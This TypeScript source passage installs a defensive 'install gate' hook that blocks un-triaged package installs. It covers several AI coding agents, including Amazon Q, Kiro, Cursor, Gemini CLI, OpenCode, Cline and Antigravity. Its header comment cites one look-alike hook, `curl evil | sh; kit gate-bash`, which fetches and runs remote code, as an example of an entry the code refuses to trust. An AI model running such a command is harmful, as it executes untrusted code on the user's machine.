/**
 * kit's install gate (`kit gate-bash`) for Amazon Q, Kiro, Cursor, Factory Droid, Gemini CLI,
 * OpenCode, Cline and Antigravity: where each
 * agent reads a pre-tool hook, in the shape it documents, failing closed where it can.
 *
 * Every installer treats an existing entry as kit's only when its command is exactly a string kit
 * writes (src/kit-gate-command.ts). A look-alike (`curl evil | sh; kit gate-bash`) is left where it
 * is, never copied or migrated, and named in the result.
 */
import { chmod, lstat, mkdir, open, readFile, rename, rm, writeFile } from "node:fs/promises";
import { constants, existsSync, readdirSync } from "node:fs";
import { randomBytes } from "node:crypto";
import { dirname, join, resolve } from "node:path";
import { isGateLookalike, isKitGateCommand, kitGateInvocation } from "./kit-gate-command.js";
import {
  detectOpenCodeVersion,
  isV1OnlyPlugin,
  openCodePluginApi,
  renderOpenCodeInstallGate,
} from "./opencode-gate.js";

export interface HookInstallResult {
  file: string;
  action: "created" | "updated" | "unchanged" | "skipped" | "failed";
  detail?: string;
  /** Steps a person must still take before the agent runs the hook (Codex trust, Gemini folder trust). */
  next?: string[];
}

type WriteAction = "created" | "updated" | "unchanged" | "failed";

function errorText(err: unknown): string {
  return err instanceof Error ? err.message : String(err);
}

function lookalikeNote(count: number): string {
  return count > 0 ? `left ${count} gate-bash look-alike hook(s) untouched: not kit's` : "";
}

function joinNotes(...notes: string[]): string | undefined {
  return notes.filter(Boolean).join("; ") || undefined;
}

async function readText(path: string): Promise<string | null> {
  try {
    return await readFile(path, "utf-8");
  } catch {
    return null;
  }
}

/** Parse a JSON object, or {} for an absent, unparseable or non-object file. */
function parseObject(raw: string | null): Record<string, unknown> {
  try {
    const v: unknown = raw === null ? {} : JSON.parse(raw);
    return v && typeof v === "object" && !Array.isArray(v) ? (v as Record<string, unknown>) : {};
  } catch {
    return {};
  }
}

/** Write `doc` unless it equals what was read. */
async function writeIfChanged(
  path: string,
  raw: string | null,
  doc: unknown,
): Promise<{ action: WriteAction; detail?: string }> {
  try {
    if (raw !== null && JSON.stringify(JSON.parse(raw)) === JSON.stringify(doc)) {
      return { action: "unchanged" };
    }
  } catch {
    // unparseable before: rewrite
  }
  try {
    await mkdir(dirname(path), { recursive: true });
    await writeFile(path, JSON.stringify(doc, null, 2) + "\n", "utf-8");
    return { action: raw === null ? "created" : "updated" };
  } catch (err) {
    return { action: "failed", detail: errorText(err) };
  }
}

async function readOnly(): Promise<boolean> {
  const { isReadOnlyMode } = await import("./read-only-mode.js");
  return isReadOnlyMode();
}

// ---------------------------------------------------------------- Amazon Q and Kiro legacy agents

/**
 * The shell tool in the Amazon Q / Kiro CLI 2.x agent schema: `execute_bash`, and `execute_cmd` on
 * Windows (aws/amazon-q-developer-cli 15cc8f3c, crates/chat-cli/src/cli/chat/tools/mod.rs:74-87).
 * Only one exists per platform, so the gate never runs twice. Each is an exact matcher: Amazon Q
 * matches a hook by exact name or glob (cli/chat/cli/hooks.rs:55-85, util/pattern_matching.rs:6-22),
 * so neither selects `fs_write`, whose `tool_input.command` is "create", "str_replace", "insert" or
 * "append" (cli/chat/tools/fs_write.rs:57-86) and would read as a shell command to gate-bash.
 * Never widen these to `*`, `@builtin` or no matcher.
 */
const AMAZONQ_SHELL_MATCHERS = ["execute_bash", "execute_cmd"] as const;

type LegacyAgentHook = { matcher?: string; command?: unknown };

/** The legacy `hooks.preToolUse` list of an agent, created if absent; null for another shape. */
function legacyPreToolUse(agent: { hooks?: unknown }): LegacyAgentHook[] | null {
  if (agent.hooks === undefined) agent.hooks = {};
  // Kiro V3's array form: setting a key on an array is dropped by JSON.stringify, a false wire.
  if (typeof agent.hooks !== "object" || agent.hooks === null || Array.isArray(agent.hooks)) {
    return null;
  }
  const hooks = agent.hooks as { preToolUse?: unknown };
  hooks.preToolUse ??= [];
  return Array.isArray(hooks.preToolUse) ? (hooks.preToolUse as LegacyAgentHook[]) : null;
}

interface LegacyWiring {
  wired: number;
  already: number;
  otherShape: number;
  lookalikes: number;
}

/** Add kit's missing matcher entries to one parsed agent. Returns how many it added, or null. */
function upsertLegacyAgentGate(agent: { hooks?: unknown }, tally: LegacyWiring): number | null {
  const pre = legacyPreToolUse(agent);
  if (!pre) return null;
  tally.lookalikes += pre.filter((h) => isGateLookalike(h?.command)).length;
  const ours = pre.filter((h) => isKitGateCommand(h?.command));
  const missing = AMAZONQ_SHELL_MATCHERS.filter((m) => !ours.some((h) => h.matcher === m));
  for (const matcher of missing) pre.push({ matcher, command: kitGateInvocation() });
  return missing.length;
}

/** Wire every agent file in the legacy object form. */
async function wireLegacyAgentConfigs(agentFiles: string[]): Promise<LegacyWiring> {
  const tally: LegacyWiring = { wired: 0, already: 0, otherShape: 0, lookalikes: 0 };
  for (const path of agentFiles) {
    const raw = await readText(path);
    let agent: { hooks?: unknown };
    try {
      agent = JSON.parse(raw ?? "");
    } catch {
      continue; // skip unparseable agent file
    }
    const added = upsertLegacyAgentGate(agent, tally);
    if (added === null) tally.otherShape++;
    else if (added === 0) tally.already++;
    else if ((await writeIfChanged(path, raw, agent)).action !== "failed") tally.wired++;
  }
  return tally;
}

function agentConfigFiles(dirPath: string, ext: string): string[] {
  try {
    return readdirSync(dirPath)
      .filter((f) => f.endsWith(ext))
      .map((f) => join(dirPath, f));
  } catch {
    return [];
  }
}

/**
 * Amazon Q install-gate: `hooks.preToolUse` entries (`execute_bash`, and `execute_cmd` for
 * Windows) in each agent config under `.amazonq/cli-agents/*.json`. Amazon Q keeps hooks per
 * agent, so every existing agent file is wired; none present is a skip, not a guessed path.
 * Idempotent; adds a missing `execute_cmd` entry to an agent kit wired before.
 */
export async function installInstallGateAmazonQ(
  cwd: string = process.cwd(),
): Promise<HookInstallResult> {
  const file = ".amazonq/cli-agents";
  if (await readOnly()) return { file, action: "skipped", detail: "read-only mode" };
  const agentFiles = agentConfigFiles(resolve(cwd, file), ".json");
  if (agentFiles.length === 0) {
    return { file, action: "skipped", detail: "no Amazon Q agent config found" };
  }
  const t = await wireLegacyAgentConfigs(agentFiles);
  const flag = lookalikeNote(t.lookalikes);
  if (t.wired === 0) {
    const detail = joinNotes(`install-gate already wired (${t.already} agent[s])`, flag);
    return { file, action: "unchanged", detail };
  }
  const detail = joinNotes(`wired ${t.wired} Amazon Q agent config(s)`, flag);
  return { file, action: "updated", detail };
}

// ---------------------------------------------------------------------------------------- Kiro

/** kit's standalone Kiro hook file (IDE 1.0, CLI V3, Kiro Web). */
const KIRO_HOOK_FILE = ".kiro/hooks/kit-install-gate.json";

type KiroHook = { trigger?: unknown; matcher?: unknown; action?: { command?: unknown } };

/**
 * AWS Kiro install-gate.
 *
 * Kiro IDE 1.0 and CLI V3 read standalone `.kiro/hooks/<id>.json` files,
 * `{"version":"v1","hooks":[{name, trigger, matcher, action:{type, command}}]}`, for every agent
 * profile (kiro.dev/docs/hooks.md "Hook file schema"). That file is the gate: matcher `shell`, the
 * tag for `execute_bash` / `execute_pwsh` (kiro.dev/docs/tools.md), which holds no write tool.
 * Agent profiles may be `.md` files with YAML front matter
 * (kiro.dev/docs/custom-agents/configuration-reference.md "Markdown format"); the standalone file
 * covers them, so kit does not edit their YAML.
 *
 * CLI 2.x read hooks only from `.kiro/agents/*.json`, in the object form
 * `{"hooks":{"preToolUse":[{matcher, command}]}}`, and CLI V3 still accepts that form as
 * compatibility input (kiro.dev/docs/cli/v3/hooks-migration.md). So kit keeps wiring JSON agents
 * that use it, with `execute_cmd` (the CLI 2.x Windows shell name) next to `execute_bash`. Under
 * CLI V3 such an agent runs the gate twice, from both places: same verdict, a second audit line.
 * Agents in the V3 array form are left alone; the standalone file covers them.
 */
export async function installInstallGateKiro(
  cwd: string = process.cwd(),
): Promise<HookInstallResult> {
  const file = KIRO_HOOK_FILE;
  if (await readOnly()) return { file, action: "skipped", detail: "read-only mode" };
  if (!existsSync(resolve(cwd, ".kiro"))) {
    return { file, action: "skipped", detail: "no Kiro project detected" };
  }
  const standalone = await upsertKiroStandaloneGate(resolve(cwd, file));
  if (standalone.action === "failed") return { file, action: "failed", detail: standalone.detail };

  const agentsDir = resolve(cwd, ".kiro/agents");
  const t = await wireLegacyAgentConfigs(agentConfigFiles(agentsDir, ".json"));
  const mdAgents = agentConfigFiles(agentsDir, ".md").length;
  const notes = joinNotes(
    t.wired > 0 ? `wired ${t.wired} legacy .kiro/agents JSON config(s)` : "",
    t.otherShape > 0 ? `${t.otherShape} V3 agent(s) covered by ${file}` : "",
    mdAgents > 0 ? `${mdAgents} .md agent(s) covered by ${file}` : "",
    lookalikeNote(t.lookalikes + standalone.lookalikes),
  );
  if (standalone.action === "unchanged" && t.wired === 0) {
    return {
      file,
      action: "unchanged",
      detail: joinNotes("install-gate already wired", notes ?? ""),
    };
  }
  const action = standalone.action === "created" && t.wired === 0 ? "created" : "updated";
  return { file, action, ...(notes ? { detail: notes } : {}) };
}

async function upsertKiroStandaloneGate(
  path: string,
): Promise<{ action: WriteAction; detail?: string; lookalikes: number }> {
  const raw = await readText(path);
  const parsed = parseObject(raw);
  // kit owns this file name; an unreadable one is rewritten rather than left as a dead gate.
  const doc = Array.isArray(parsed.hooks) ? parsed : { hooks: [] };
  doc.version = "v1";
  const hooks = doc.hooks as KiroHook[];
  const lookalikes = hooks.filter((h) => isGateLookalike(h?.action?.command)).length;
  const ours = hooks.find((h) => isKitGateCommand(h?.action?.command));
  if (ours) {
    // Keep kit's own command (a portable or refreshed line); fix only the contract.
    ours.trigger = "PreToolUse";
    ours.matcher = "shell";
  } else {
    hooks.push({
      name: "kit-install-gate",
      description: "kit gate-bash: blocks un-triaged package installs before the shell runs them",
      trigger: "PreToolUse",
      matcher: "shell",
      action: { type: "command", command: kitGateInvocation() },
    } as KiroHook);
  }
  return { ...(await writeIfChanged(path, raw, doc)), lookalikes };
}

// -------------------------------------------------------------------------------------- Cursor

type CursorHook = { command?: unknown; failClosed?: boolean };

/** Make kit's own Cursor entries fail closed with the cursor format. Returns whether it changed. */
function migrateCursorEntry(h: CursorHook): boolean {
  const command = String(h.command);
  const wanted = /--format cursor$/.test(command) ? command : `${command} --format cursor`;
  const changed = h.command !== wanted || h.failClosed !== true;
  h.command = wanted;
  h.failClosed = true;
  return changed;
}

/**
 * Cursor install-gate: a `beforeShellExecution` hook in `.cursor/hooks.json`. Cursor passes the
 * shell command at top-level `command` and blocks on exit 2.
 *
 * Fail closed. Cursor allows the call when a hook crashes, times out or exits non-zero (other than
 * 2), unless the hook sets `failClosed: true`; with it, "no output" is a failure too
 * (cursor.com/docs/agent/hooks, hook fields). So the entry sets `failClosed: true` and runs
 * `gate-bash --format cursor`, which prints `{"permission":"allow"}` on allow. kit's older
 * entries are migrated in place. Idempotent; preserves other hooks.
 *
 * Cursor also runs `.claude/settings.json` hooks by default ("Include Third-Party Plugins, Skills,
 * and Other Configs", cursor.com/docs/reference/third-party-hooks), mapping Claude's `Bash` to its
 * `Shell` tool, so kit's Claude Code gate runs as well and each shell call is gated twice. kit keeps
 * both: the docs offer only the global setting to stop the import, no per-hook dedupe, and turning
 * the import off would also drop kit's other Claude Code gates. Two identical verdicts cost one
 * extra gate run, and this entry is the only one of the two that fails closed.
 */
export async function installInstallGateCursor(
  cwd: string = process.cwd(),
): Promise<HookInstallResult> {
  const file = ".cursor/hooks.json";
  const path = resolve(cwd, file);
  if (await readOnly()) return { file, action: "skipped", detail: "read-only mode" };
  if (!existsSync(resolve(cwd, ".cursor"))) {
    return { file, action: "skipped", detail: "no Cursor project detected" };
  }
  const raw = await readText(path);
  const cfg = parseObject(raw);
  cfg.version ??= 1;
  const hooks = (cfg.hooks ??= {}) as Record<string, CursorHook[]>;
  const pre = (hooks.beforeShellExecution ??= []);
  const ours = pre.filter((h) => isKitGateCommand(h?.command));
  const flag = lookalikeNote(pre.filter((h) => isGateLookalike(h?.command)).length);
  const migrated = ours.map(migrateCursorEntry).some(Boolean);
  if (ours.length === 0) {
    pre.push({ command: `${kitGateInvocation()} --format cursor`, failClosed: true });
  }
  const r = await writeIfChanged(path, raw, cfg);
  const detail =
    r.action === "unchanged"
      ? joinNotes("install-gate already wired", flag)
      : joinNotes(
          migrated ? "install-gate now fails closed (failClosed: true)" : "",
          flag,
          r.detail ?? "",
        );
  return { file, action: r.action, ...(detail ? { detail } : {}) };
}

// ------------------------------------------------------------------------------- Factory Droid

type DroidHandler = { type?: string; command?: unknown; onFailure?: string };
type DroidGroup = { matcher?: string; hooks?: DroidHandler[] };

/** Droid's shell tool. kit's handler counts as wired only under this matcher. */
const DROID_SHELL_MATCHER = "Execute";

const holdsKitHandler = (g: DroidGroup): boolean =>
  g?.hooks?.some((h) => isKitGateCommand(h?.command)) ?? false;

/** A group that runs kit's gate on shell calls: kit's exact line under the Execute matcher. A kit
 *  line under any other matcher never fires on a shell call, so it does not count as wired. */
const hasKitHandler = (g: DroidGroup): boolean =>
  g?.matcher === DROID_SHELL_MATCHER && holdsKitHandler(g);

/**
 * Move kit's own handlers out of the `hooks` wrapper an older kit wrote into `hooks.json`. Only
 * handlers that are exactly kit's move; any other handler in the same group stays where it was.
 */
function liftWrappedKitHandlers(doc: Record<string, unknown>, pre: DroidGroup[]): void {
  const wrapper = doc.hooks as { PreToolUse?: unknown } | undefined;
  if (!wrapper || typeof wrapper !== "object" || !Array.isArray(wrapper.PreToolUse)) return;
  const wrapped = wrapper.PreToolUse as DroidGroup[];
  for (const group of wrapped.filter(holdsKitHandler)) {
    const kit = (group.hooks ?? []).filter((h) => isKitGateCommand(h?.command));
    group.hooks = (group.hooks ?? []).filter((h) => !isKitGateCommand(h?.command));
    if (!pre.some(hasKitHandler)) pre.push({ matcher: DROID_SHELL_MATCHER, hooks: kit });
  }
  wrapper.PreToolUse = wrapped.filter((g) => (g.hooks ?? []).length > 0);
  if ((wrapper.PreToolUse as unknown[]).length === 0) delete wrapper.PreToolUse;
  if (Object.keys(wrapper).length === 0) delete doc.hooks;
}

/** Every handler in an event-keyed file and in its `hooks` wrapper. */
function droidHandlers(doc: Record<string, unknown>): DroidHandler[] {
  const groups = [
    ...(Array.isArray(doc.PreToolUse) ? (doc.PreToolUse as DroidGroup[]) : []),
    ...(Array.isArray((doc.hooks as { PreToolUse?: unknown })?.PreToolUse)
      ? ((doc.hooks as { PreToolUse: DroidGroup[] }).PreToolUse as DroidGroup[])
      : []),
  ];
  return groups.flatMap((g) => g?.hooks ?? []);
}

/** The Droid hook file to edit: the scoped file, or the legacy one when only it exists. */
function droidHookFile(cwd: string): string {
  const scopeFile = ".factory/hooks.json";
  const legacyFile = ".factory/hooks/hooks.json";
  const useLegacy = !existsSync(resolve(cwd, scopeFile)) && existsSync(resolve(cwd, legacyFile));
  return useLegacy ? legacyFile : scopeFile;
}

/** Ensure kit's Execute handler exists and every kit handler fails closed. */
function wireDroidGate(doc: Record<string, unknown>, pre: DroidGroup[]): void {
  liftWrappedKitHandlers(doc, pre);
  if (!pre.some(hasKitHandler)) {
    pre.push({
      matcher: DROID_SHELL_MATCHER,
      hooks: [{ type: "command", command: kitGateInvocation() }],
    });
  }
  for (const h of pre.flatMap((g) => g?.hooks ?? [])) {
    if (isKitGateCommand(h?.command)) h.onFailure = "block";
  }
}

/**
 * Factory Droid install-gate: a `PreToolUse` hook (matcher `Execute`) in `.factory/hooks.json`.
 * Droid passes the command at `tool_input.command` and blocks on exit 2.
 *
 * Shape. A standalone `hooks.json` (and the legacy `hooks/hooks.json`, read while `hooks.json` is
 * absent) is keyed directly by event name: `{"PreToolUse":[...]}`. Only `settings.json` wraps the
 * map in `hooks` (docs.factory.com/reference/hooks-reference.md, "Structure"). kit used to write the
 * `hooks` wrapper into `hooks.json`; kit's own handlers are lifted to the top level here.
 *
 * Fail closed. A hook that times out or cannot start is a non-blocking error unless it sets
 * `onFailure: "block"` (same page, "Block when a hook fails"); kit's entry sets it. gate-bash exits
 * 0 with no JSON on allow, which Droid treats as success, so the setting never blocks an allow.
 *
 * Idempotent; preserves the user's other hooks. While only the legacy file exists it is fixed in
 * place, so kit does not create a `hooks.json` that would hide the user's legacy hooks.
 */
export async function installInstallGateDroid(
  cwd: string = process.cwd(),
): Promise<HookInstallResult> {
  const scopeFile = ".factory/hooks.json";
  if (await readOnly()) return { file: scopeFile, action: "skipped", detail: "read-only mode" };
  if (!existsSync(resolve(cwd, ".factory"))) {
    return { file: scopeFile, action: "skipped", detail: "no Factory Droid project detected" };
  }
  const file = droidHookFile(cwd);
  const path = resolve(cwd, file);
  const raw = await readText(path);
  const doc = parseObject(raw);
  if (doc.PreToolUse !== undefined && !Array.isArray(doc.PreToolUse)) {
    return { file, action: "failed", detail: "PreToolUse in hooks.json is not a list" };
  }
  const pre = (doc.PreToolUse ??= []) as DroidGroup[];
  wireDroidGate(doc, pre);
  const flag = lookalikeNote(droidHandlers(doc).filter((h) => isGateLookalike(h?.command)).length);
  const r = await writeIfChanged(path, raw, doc);
  const detail = joinNotes(
    r.action === "unchanged" ? "install-gate already wired" : "",
    flag,
    r.detail ?? "",
  );
  return { file, action: r.action, ...(detail ? { detail } : {}) };
}

// ---------------------------------------------------------------- Gemini CLI, OpenCode, Cline, Antigravity

interface SettingsHookCmd {
  type?: string;
  command: string;
}
interface SettingsHookGroup {
  matcher?: string;
  hooks?: SettingsHookCmd[];
}

/**
 * Gemini CLI runs no settings hook in an untrusted folder, user-level hooks included
 * (google-gemini/gemini-cli `packages/core/src/hooks/hookRegistry.ts:171-186`, commit 60f8082b), and
 * folder trust is on by default (`packages/cli/src/config/settingsSchema.ts`, `folderTrust.enabled`).
 * `/permissions trust` (`packages/cli/src/ui/commands/permissionsCommand.ts:23-30`) records the
 * folder in `~/.gemini/trustedFolders.json`.
 */
export const GEMINI_TRUST_NOTICE =
  "Gemini CLI runs this gate only in a trusted folder. In Gemini CLI, run `/permissions trust` in this folder (it is saved in ~/.gemini/trustedFolders.json).";

/**
 * Gemini CLI install-gate: a `BeforeTool` hook in `.gemini/settings.json` (same
 * nested hooks > Event > matcher > hooks[] shape as Claude Code). Gemini passes
 * the command in tool_input.command. When a hook prints JSON, the JSON decides and the
 * exit code is ignored (`packages/core/src/hooks/hookRunner.ts:451-489`), so the gate runs
 * with `--format gemini`: a stdout `{"decision":"deny"}` plus stderr and exit 2. An older kit
 * hook line is refreshed in place. Idempotent; preserves other settings/hooks.
 */
export async function installInstallGateGemini(
  cwd: string = process.cwd(),
): Promise<HookInstallResult> {
  const file = ".gemini/settings.json";
  const path = resolve(cwd, file);
  const { isReadOnlyMode } = await import("./read-only-mode.js");
  if (isReadOnlyMode()) return { file, action: "skipped", detail: "read-only mode" };
  if (!existsSync(resolve(cwd, ".gemini"))) {
    return { file, action: "skipped", detail: "no Gemini CLI project detected" };
  }
  const next = [GEMINI_TRUST_NOTICE];
  let settings: { hooks?: Record<string, SettingsHookGroup[]>; [k: string]: unknown } = {};
  let existed = false;
  try {
    settings = JSON.parse(await readFile(path, "utf-8")) as typeof settings;
    existed = true;
  } catch {
    settings = {};
  }
  const hooks = (settings.hooks ??= {});
  const pre = (hooks.BeforeTool ??= []);
  const desired = `${kitGateInvocation()} --format gemini`;
  const kitHook = pre.flatMap((g) => g.hooks ?? []).find((h) => isKitGateCommand(h.command));
  if (kitHook?.command === desired) {
    return { file, action: "unchanged", detail: "install-gate already wired", next };
  }
  if (kitHook) kitHook.command = desired;
  else pre.push({ matcher: "", hooks: [{ type: "command", command: desired }] });
  try {
    await mkdir(dirname(path), { recursive: true });
    await writeFile(path, JSON.stringify(settings, null, 2) + "\n", "utf-8");
    return { file, action: existed ? "updated" : "created", next };
  } catch (err) {
    return { file, action: "failed", detail: err instanceof Error ? err.message : String(err) };
  }
}

async function readOpenCodePlugin(path: string): Promise<string> {
  const handle = await open(path, constants.O_RDONLY | (constants.O_NOFOLLOW ?? 0));
  try {
    if (!(await handle.stat()).isFile()) throw new Error("OpenCode gate path is not a file");
    return await handle.readFile("utf8");
  } finally {
    await handle.close();
  }
}

async function writeOpenCodePlugin(path: string, content: string, replace: boolean): Promise<void> {
  if (!replace) {
    await writeFile(path, content, { encoding: "utf8", flag: "wx", mode: 0o600 });
    return;
  }
  const temporary = `${path}.kit-tmp-${process.pid}-${randomBytes(12).toString("hex")}`;
  try {
    await writeFile(temporary, content, { encoding: "utf8", flag: "wx", mode: 0o600 });
    await rename(temporary, path);
  } finally {
    await rm(temporary, { force: true });
  }
}

/**
 * OpenCode install-gate: unlike the other agents (which register a hook *command*
 * in a config file), OpenCode enforces via a JS **plugin** that blocks a tool call by
 * throwing. We write one managed plugin to `.opencode/plugin/kit-install-gate.js`. No single file
 * loads in every OpenCode release (opencode-gate.ts has the loader evidence), so the installed
 * OpenCode version picks the form: 1.0 to 1.3 get the function-only V1 plugin, 1.4 and later
 * (2.x included) the plugin with a default object. When the version cannot be read, a new install
 * gets the 1.4+ form, and a V1 plugin that kit wrote earlier is kept, because it may be the one
 * that works. Exact current output is idempotent; an independently managed gate is never
 * overwritten.
 */
export async function installInstallGateOpenCode(
  cwd: string = process.cwd(),
  version: (projectRoot: string) => string | undefined = detectOpenCodeVersion,
): Promise<HookInstallResult> {
  const file = ".opencode/plugin/kit-install-gate.js";
  const path = resolve(cwd, file);
  const { isReadOnlyMode } = await import("./read-only-mode.js");
  if (isReadOnlyMode()) return { file, action: "skipped", detail: "read-only mode" };
  const markers = [".opencode", "opencode.json", "opencode.jsonc"];
  if (!markers.some((m) => existsSync(resolve(cwd, m)))) {
    return { file, action: "skipped", detail: "no OpenCode project detected" };
  }
  const current = await readExistingOpenCodePlugin(path, file);
  if (typeof current !== "string" && current !== undefined) return current;
  return writeOpenCodeGate(path, file, current, openCodePluginApi(version(cwd)));
}

/** Write the plugin form for `api`; an unknown version keeps a 1.x plugin kit wrote before. */
async function writeOpenCodeGate(
  path: string,
  file: string,
  current: string | undefined,
  api: ReturnType<typeof openCodePluginApi>,
): Promise<HookInstallResult> {
  if (api === undefined && current !== undefined && isV1OnlyPlugin(current)) {
    const detail = "kept the OpenCode 1.x plugin";
    return { file, action: "unchanged", detail, next: [OPENCODE_UNKNOWN_KEEP] };
  }
  const plugin = renderOpenCodeInstallGate(api ?? "both");
  const next = api === undefined ? [OPENCODE_UNKNOWN_NEW] : undefined;
  if (current === plugin) {
    return { file, action: "unchanged", detail: "install-gate already wired", next };
  }
  try {
    await mkdir(dirname(path), { recursive: true });
    await writeOpenCodePlugin(path, plugin, current !== undefined);
    return { file, action: current !== undefined ? "updated" : "created", next };
  } catch (err) {
    return { file, action: "failed", detail: err instanceof Error ? err.message : String(err) };
  }
}

const OPENCODE_UNKNOWN_KEEP =
  "kit could not read the OpenCode version, so it kept the OpenCode 1.x gate plugin. OpenCode 2.x does not load that plugin: put `opencode` on PATH and run kit agent-config again.";
const OPENCODE_UNKNOWN_NEW =
  "kit could not read the OpenCode version. The gate plugin loads in OpenCode 1.4 and later; OpenCode 1.0 to 1.3 do not load it.";

/**
 * The kit-managed plugin text at `path`; undefined when there is none. A result object when kit
 * must not write there: a symlink, an external file, or a read error.
 */
async function readExistingOpenCodePlugin(
  path: string,
  file: string,
): Promise<string | undefined | HookInstallResult> {
  try {
    const info = await lstat(path);
    if (info.isSymbolicLink() || !info.isFile()) {
      return { file, action: "skipped", detail: "external or symlinked path; refusing overwrite" };
    }
    const current = await readOpenCodePlugin(path);
    if (current.includes("Generated by `kit agent-config --install-gate`")) return current;
    return current.includes("gate-bash")
      ? { file, action: "unchanged", detail: "external install-gate already wired" }
      : { file, action: "skipped", detail: "external file exists; refusing overwrite" };
  } catch (err) {
    if ((err as NodeJS.ErrnoException).code === "ENOENT") return undefined;
    return { file, action: "failed", detail: err instanceof Error ? err.message : String(err) };
  }
}

/**
 * Cline install-gate: Cline discovers an EXECUTABLE script named exactly the
 * event (`PreToolUse`, no extension) under `.clinerules/hooks/` and runs it as a
 * subprocess, feeding the tool call as JSON on stdin. Unlike the exit-2 agents
 * and OpenCode's plugin-throw, Cline blocks via a **stdout JSON** contract
 * (`{cancel:true,errorMessage}` — `HookOutputSchema`). Verified against
 * @cline/core (`HookConfigFileName.PreToolUse`, `HOOKS_CONFIG_DIRECTORY_NAME`)
 * and @cline/shared (`PreToolUseData {toolName, parameters}`, payload nested
 * under `preToolUse`). We write a tiny sh shim that execs `kit gate-bash
 * --format cline`, which reads that payload and emits the cancel-JSON.
 */
export async function installInstallGateCline(
  cwd: string = process.cwd(),
): Promise<HookInstallResult> {
  const file = ".clinerules/hooks/PreToolUse";
  const path = resolve(cwd, file);
  const { isReadOnlyMode } = await import("./read-only-mode.js");
  if (isReadOnlyMode()) return { file, action: "skipped", detail: "read-only mode" };
  if (!existsSync(resolve(cwd, ".clinerules")) && !existsSync(resolve(cwd, ".cline"))) {
    return { file, action: "skipped", detail: "no Cline project detected" };
  }

  const existed = existsSync(path);
  if (existed) {
    try {
      if ((await readFile(path, "utf-8")).includes("gate-bash")) {
        return { file, action: "unchanged", detail: "install-gate already wired" };
      }
    } catch {
      // unreadable → overwrite below
    }
  }

  const script = `#!/bin/sh
# kit install-gate (Cline PreToolUse hook). Generated by \`kit agent-config
# --install-gate\`. Delete this file to disable. Reads the tool call on stdin and
# blocks an un-triaged install via the {cancel:true} stdout contract.
exec ${kitGateInvocation()} --format cline
`;
  try {
    await mkdir(dirname(path), { recursive: true });
    await writeExecutable(path, script);
    return { file, action: existed ? "updated" : "created" };
  } catch (err) {
    return { file, action: "failed", detail: err instanceof Error ? err.message : String(err) };
  }
}

/**
 * Write an executable file through a new temporary file and a rename, so the path checked
 * above is never written in place. The mode is set before the rename (no-op on Windows).
 */
async function writeExecutable(path: string, content: string): Promise<void> {
  const temporary = `${path}.kit-tmp-${process.pid}-${randomBytes(12).toString("hex")}`;
  try {
    await writeFile(temporary, content, { encoding: "utf8", flag: "wx", mode: 0o755 });
    await chmod(temporary, 0o755).catch(() => {});
    await rename(temporary, path);
  } finally {
    await rm(temporary, { force: true });
  }
}

/** The name of kit's hook in Antigravity's `hooks.json`, whose top-level keys are hook names. */
export const ANTIGRAVITY_HOOK_NAME = "kit-install-gate";

interface AntigravityHook {
  enabled?: boolean;
  [event: string]: unknown;
}

/** True when a hook group runs kit's gate. */
function runsKitGate(group: SettingsHookGroup): boolean {
  return (group.hooks ?? []).some((h) => isKitGateCommand(h.command));
}

/**
 * Move kit's gate out of the `{"hooks": {...}}` shape older kit versions wrote. Antigravity reads
 * that as one hook named `hooks`, so the user's other groups in it keep running there; only kit's
 * group leaves, and the `hooks` key goes when nothing else is left in it. Returns true on a change.
 */
function migrateLegacyAntigravity(config: Record<string, unknown>): boolean {
  const legacy = config.hooks;
  if (!legacy || typeof legacy !== "object" || Array.isArray(legacy)) return false;
  const events = legacy as Record<string, unknown>;
  const pre = events.PreToolUse;
  if (!Array.isArray(pre)) return false;
  const kept = (pre as SettingsHookGroup[]).filter((g) => !runsKitGate(g));
  if (kept.length === pre.length) return false;
  if (kept.length > 0) events.PreToolUse = kept;
  else delete events.PreToolUse;
  const rest = Object.keys(events).filter((k) => k !== "enabled");
  if (rest.length === 0) delete config.hooks;
  return true;
}

/** Read `.agents/hooks.json`: an object, or nothing yet. Never overwrites what it cannot parse. */
async function readAntigravityConfig(
  path: string,
  file: string,
): Promise<{ config: Record<string, unknown>; existed: boolean } | HookInstallResult> {
  let text: string;
  try {
    text = await readFile(path, "utf-8");
  } catch (err) {
    if ((err as NodeJS.ErrnoException).code === "ENOENT") return { config: {}, existed: false };
    return { file, action: "failed", detail: `cannot read ${file}: ${String(err)}` };
  }
  try {
    const parsed: unknown = JSON.parse(text);
    if (parsed && typeof parsed === "object" && !Array.isArray(parsed)) {
      return { config: parsed as Record<string, unknown>, existed: true };
    }
  } catch {
    /* reported below */
  }
  return { file, action: "failed", detail: `${file} is not a JSON object; refusing overwrite` };
}

/** kit's named Antigravity hook, enabled, with its gate line set to `desired`. */
function withKitAntigravityGate(
  current: AntigravityHook | undefined,
  groups: SettingsHookGroup[],
  kitHook: SettingsHookCmd | undefined,
  desired: string,
): AntigravityHook {
  if (kitHook && current) {
    kitHook.command = desired;
    return { ...current, enabled: true };
  }
  return {
    ...(current ?? {}),
    enabled: true,
    PreToolUse: [
      ...groups,
      { matcher: "run_command", hooks: [{ type: "command", command: desired, timeout: 30 }] },
    ],
  };
}

/**
 * Google Antigravity install-gate: a `PreToolUse` hook in the workspace-scoped
 * `.agents/hooks.json` (preferred over the global ~/.gemini/config/hooks.json to
 * keep kit's per-project pattern). The file's top-level keys are hook names:
 * `{"kit-install-gate": {"enabled": true, "PreToolUse": [{"matcher": "run_command", "hooks": [...]}]}}`
 * (https://antigravity.google/docs/hooks.md, fetched 2026-11-26; Antigravity is closed source).
 * Antigravity carries the command at `toolCall.args.CommandLine` and reads a required stdout
 * `decision`; its exit-code meaning is not documented, so `--format antigravity` writes the
 * decision and also exits 2 on a deny. Migrates kit's older `{"hooks": {...}}` entry without
 * dropping the user's hooks. Idempotent. Detected via a repo `.agents/` dir.
 */
export async function installInstallGateAntigravity(
  cwd: string = process.cwd(),
): Promise<HookInstallResult> {
  const file = ".agents/hooks.json";
  const path = resolve(cwd, file);
  const { isReadOnlyMode } = await import("./read-only-mode.js");
  if (isReadOnlyMode()) return { file, action: "skipped", detail: "read-only mode" };
  if (!existsSync(resolve(cwd, ".agents"))) {
    return { file, action: "skipped", detail: "no Antigravity (.agents/) project detected" };
  }
  const read = await readAntigravityConfig(path, file);
  if ("action" in read) return read;
  const { config, existed } = read;
  const migrated = migrateLegacyAntigravity(config);
  const desired = `${kitGateInvocation()} --format antigravity`;
  const current = config[ANTIGRAVITY_HOOK_NAME] as AntigravityHook | undefined;
  const groups = Array.isArray(current?.PreToolUse)
    ? (current.PreToolUse as SettingsHookGroup[])
    : [];
